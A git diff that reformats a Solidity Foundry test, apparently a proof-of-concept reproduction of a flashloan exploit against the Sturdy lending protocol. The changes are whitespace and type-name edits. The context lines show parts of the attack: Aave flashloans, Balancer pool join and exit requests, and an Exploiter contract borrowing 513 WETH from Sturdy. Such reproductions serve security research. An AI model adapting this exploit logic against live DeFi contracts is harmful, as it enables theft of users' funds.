@@ -19,7 +19,9 @@ import "./../interface.sol";
 // Twitter Guy : https://twitter.com/BlockSecTeam/status/1668084629654638592
 
 interface IwstETH is IERC20 {
-    function unwrap(uint256 _wstETHAmount) external returns (uint256);
+    function unwrap(
+        uint256 _wstETHAmount
+    ) external returns (uint256);
 }
 
 interface IMetaStablePool is IERC20 {
@@ -35,7 +37,9 @@ interface LendingPool {
         address onBehalfOf
     ) external;
 
-    function getUserAccountData(address user)
+    function getUserAccountData(
+        address user
+    )
         external
         view
         returns (
@@ -81,7 +85,9 @@ interface IBalancerQueries {
 }
 
 interface ISturdyOracle {
-    function getAssetPrice(address asset) external view returns (uint256);
+    function getAssetPrice(
+        address asset
+    ) external view returns (uint256);
 }
 
 contract ContractTest is Test {
@@ -124,7 +130,7 @@ contract ContractTest is Test {
         uint256[] memory amounts = new uint256[](2);
         amounts[0] = 50_000 * 1e18;
         amounts[1] = 60_000 * 1e18;
-        uint256[] memory modes = new uint[](2);
+        uint256[] memory modes = new uint256[](2);
         modes[0] = 0;
         modes[1] = 0;
         console.log("1. Borrow 50,000 wstETH and 60,000 WETH from Aave as a flashloan.");
@@ -207,7 +213,9 @@ contract Exploiter is Test {
         steCRV.transfer(owner, steCRV.balanceOf(address(this)));
     }
 
-    function setJoinData(uint256 amt) internal view returns (IBalancerVault.JoinPoolRequest memory request) {
+    function setJoinData(
+        uint256 amt
+    ) internal view returns (IBalancerVault.JoinPoolRequest memory request) {
         uint256[] memory amountIn = new uint256[](2);
         amountIn[0] = 50_000 * 1e18;
         amountIn[1] = 57_000 * 1e18;
@@ -247,7 +255,9 @@ contract Exploiter is Test {
         lendingPool.borrow(address(WETH), 513_367_301_825_658_717_226, 2, 0, address(this)); // Borrow 513 WETH from Sturdy.
     }
 
-    function setExitData(uint256 amt) internal view returns (IBalancerVault.ExitPoolRequest memory request) {
+    function setExitData(
+        uint256 amt
+    ) internal view returns (IBalancerVault.ExitPoolRequest memory request) {
         uint256[] memory amountOut = new uint256[](2);
         amountOut[0] = 0;
         amountOut[1] = 0;
